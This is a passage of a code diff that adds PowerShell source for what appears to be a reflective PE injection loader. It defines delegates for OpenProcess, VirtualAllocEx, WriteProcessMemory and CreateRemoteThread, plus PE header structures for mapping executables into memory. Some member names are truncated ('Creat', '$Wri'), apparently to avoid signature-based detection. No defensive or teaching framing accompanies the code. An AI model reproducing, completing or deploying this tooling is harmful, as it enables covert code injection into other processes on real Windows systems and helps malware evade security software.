+        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+        
+        Write-Output $TypeBuilder.CreateType()
+    }
+
+	Function Get-Win32Functions
+	{
+		$Win32Functions = New-Object System.Object
+		
+		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
+		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
+		
+		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
+		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
+		
+		$memsetAddr = Get-ProcAddress msvcrt.dll memset
+		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
+		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
+		
+		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
+		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
+		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
+
+        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
+		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
+		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
+        
+        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
+		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
+		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
+
+		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
+		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
+		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
+		
+		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
+		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
+		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
+		
+		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
+		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
+		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
+		
+		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
+	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
+	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
+		
+		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
+	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
+	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
+		
+		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
+		$WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+		$Wri = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $Wri
+
+		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
+        		$CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+       		$Creat = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name Creat -Value $Creat
+		
+		return $Win32Functions
+	}
+	Function Get-Win32Types
+	{
+		$Win32Types = New-Object System.Object
+
+		$Domain = [AppDomain]::CurrentDomain
+		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
+		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+
+
+		############    ENUM    ############
+		#Enum MachineType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
+		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
+		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
+		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
+		$MachineType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType
+
+		#Enum MagicType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
+		$MagicType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType
+
+		#Enum SubSystemType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
+		$SubSystemType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType
+
+		#Enum DllCharacteristicsType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
+		$DllCharacteristicsType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType
+
+		###########    STRUCT    ###########
+		#Struct IMAGE_DATA_DIRECTORY
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
+		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
+		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
+		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY
+
+		#Struct IMAGE_FILE_HEADER
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
+		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
+		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER
+
+		#Struct IMAGE_OPTIONAL_HEADER64
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
+		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
+		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
+		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
+		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
+		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
+		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
+		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
+		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
+		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
+		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
+		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
+		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
+		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
+		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
+		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
+		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
+		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
+		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
+		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
+		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
+		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
+		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
+		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
+		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
+		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
+		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
+		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
+		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
+		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
+		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
+		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
+		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
+		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
+		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
+		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
+		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
+		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
+		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
+		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
+		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
+		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
+		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
+		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64
+
+		#Struct IMAGE_OPTIONAL_HEADER32
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
+		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
+		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
+		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
+		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
+		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
+		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
+		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
+		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
+		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
+		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
+		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
+		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
+		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
+		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
+		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
+		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
+		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
+		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
+		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
+		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
+		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
+		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
+		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
+		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
+		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
+		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
+		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
+		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
+		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
+		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
+		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
+		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
+		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
+		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
+		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
+		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
+		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
+		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
+		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
+		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
+		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
+		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
+		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
+		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32
+
+		#Struct IMAGE_NT_HEADERS64
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
+		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
+		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
+		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
+		
+		#Struct IMAGE_NT_HEADERS32
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
+		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
+		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
+		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32
+
+		#Struct IMAGE_DOS_HEADER
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
+		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
+
+		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
+		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
+		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
+		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
+		$e_resField.SetCustomAttribute($AttribBuilder)
+
+		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
+
+		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
+		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
+		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
+		$e_res2Field.SetCustomAttribute($AttribBuilder)
+
+		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
+		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER
+
+		#Struct IMAGE_SECTION_HEADER
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)
+
+		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
+		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
+		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
+		$nameField.SetCustomAttribute($AttribBuilder)
+
+		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
